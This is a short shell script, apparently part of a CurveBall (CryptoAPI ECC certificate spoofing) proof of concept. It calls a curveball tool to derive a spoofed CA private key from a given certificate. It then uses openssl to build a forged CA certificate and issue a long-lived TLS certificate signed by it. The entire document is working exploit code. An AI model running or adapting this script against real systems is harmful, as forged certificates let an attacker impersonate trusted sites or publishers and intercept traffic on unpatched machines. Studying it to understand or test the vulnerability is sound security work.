if [ "$1" == "" ]; then
    echo "Missing certificate name."
    exit
fi

../curveball/curveball $1 > spoofed_ca.key

if [ $? != 0 ]; then
    echo "There was an error spoofing the certificate."
    rm spoofed_ca.key
    exit
fi

openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
openssl ecparam -name secp384r1 -genkey -noout -out cert.key
openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
